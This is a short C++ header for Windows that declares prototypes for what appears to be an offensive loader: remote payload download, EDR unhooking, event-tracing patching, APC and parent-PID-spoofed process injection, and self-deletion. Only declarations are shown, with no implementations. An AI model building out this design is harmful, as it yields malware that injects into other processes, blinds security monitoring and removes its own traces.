#pragma once
#include <vector>
#include <Windows.h>

// Functions definitions
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
DWORD GetPID();
void unhooking();
void evt_patch();

void Indirect_RawExec_ppid(DWORD exPID);
void IndirectAPC();
void IndirectRemoteAPC(DWORD exPID);

BOOL DeleteSelf();


